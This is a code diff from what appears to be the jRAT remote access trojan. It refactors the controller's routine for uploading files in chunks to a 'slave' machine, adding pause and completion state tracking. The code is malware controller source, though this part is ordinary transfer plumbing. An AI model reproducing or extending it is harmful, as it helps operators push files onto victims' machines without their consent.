@@ -6,6 +6,7 @@ import java.io.FileInputStream;
 
 import se.jrat.client.Slave;
 import se.jrat.client.ui.frames.PanelFileTransfer;
+import se.jrat.common.TransferRunnable;
 import se.jrat.common.io.TransferData;
 
 
@@ -24,38 +25,48 @@ public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
 		slave.writeLine(remoteFile);
 		System.out.println(remoteFile);
 		if (file.exists() && file.isFile()) {
-			new Thread(new Runnable() {
+			TransferData data = new TransferData();
+			PanelFileTransfer.instance.add(data);
+			data.setRemoteFile(remoteFile);
+			data.setLocalFile(file);
+			data.setTotal(file.length());
+			
+			data.setRunnable(new TransferRunnable(data) {
 				public void run() {
-					try {
-						TransferData data = new TransferData();
-						PanelFileTransfer.instance.add(data);
-						data.remote = remoteFile;
-						data.total = file.length();
+					try {							
 						slave.addToSendQueue(new Packet102BeginServerUpload(file, remoteFile));
 
 						FileInputStream fileInput = new FileInputStream(file);
 						byte[] chunk = new byte[1024 * 8];
 
 						for (long pos = 0; pos < file.length(); pos += 1024 * 8) {
+							if (pause) {
+								try {
+									Thread.sleep(Long.MAX_VALUE);
+								} catch (Exception e) {
+									e.printStackTrace();
+								}
+							}
+							System.out.println("writing " + pos);
 							int read = fileInput.read(chunk);
 							
 							slave.addToSendQueue(new Packet104ServerUploadPart(remoteFile, chunk, read));
 														
 							data.increaseRead(read);
 							PanelFileTransfer.instance.update();
-							//int p = pos > file.length() ?  (int) file.length() : (int) pos;
-							//frame.reportProgress(remoteFile, (int) ((float) p / (float) file.length() * 100.0F), p, (int) file.length());
 						}
+						
 						fileInput.close();
 						
+						data.setState(TransferData.State.COMPLETED);
 						slave.addToSendQueue(new Packet103CompleteServerUpload(remoteFile));
-						
-						PanelFileTransfer.instance.add(data);
 					} catch (Exception ex) {
 						ex.printStackTrace();
 					}
 				}
-			}).start();
+			});
+			
+			data.start();
 		}
 	}
 
